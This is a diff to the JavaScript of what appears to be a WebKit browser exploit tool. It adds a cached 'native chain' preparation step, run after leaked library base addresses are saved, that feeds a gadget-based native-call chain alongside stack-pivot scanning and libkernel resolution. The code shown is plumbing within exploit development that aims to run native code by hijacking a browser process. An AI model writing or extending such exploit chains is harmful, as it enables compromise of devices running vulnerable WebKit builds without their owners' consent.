@@ -41,10 +41,10 @@ import {
     verifyManualLibkernel,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
-import { initNativeCall } from "./native_call.js";
+import { initNativeCall, prepNativeChain } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250829x";
+const BUILD_ID = "rw-20250829y";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -113,6 +113,7 @@ let btnVerifyPivot, btnScanPivot;
 let gadgetBtns = [];
 let g5BarBtns = [];
 let nativeChain = null;
+let nativePrep = null;
 let nativeAllowed = false;
 let pivotReady = false;
 let pivotScan = null;
@@ -564,6 +565,13 @@ function saveBasesManual() {
             : resolveWebkitBase(off, nativeFn);
         if (webkitBase) {
             try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
+            try {
+                nativePrep = prepNativeChain(p, off, webkitBase);
+                mark("SAVE-PREP", "native buffers cached — getpid needs no leakval");
+            } catch (err) {
+                nativePrep = null;
+                mark("SAVE-WARN", "native prep failed: " + (err.message || err));
+            }
             mark("SAVE-OK", "nativeFn=" + nativeFn + " webkitBase=" + webkitBase);
         } else {
             mark("SAVE-OK", "nativeFn=" + nativeFn + " (no expm1 for base)");
@@ -2105,6 +2113,12 @@ async function doNativeCallImmediate() {
         state("need libkernel", "bad");
         return;
     }
+    if (!nativePrep) {
+        nativeQuiet = false;
+        mark("NATIVE-FAIL", "no prep — Save bases first (caches chain buffers)");
+        state("Save bases then Force lk", "bad");
+        return;
+    }
     if (nativeChain) {
         try { nativeChain.disarm(); } catch (_) { }
         nativeChain = null;
@@ -2119,6 +2133,7 @@ async function doNativeCallImmediate() {
             webkitBase,
             nativeFn,
             libkernelBase,
+            prep: nativePrep,
             log: mark,
             trustGadgets: true,
             trustStubs: true,
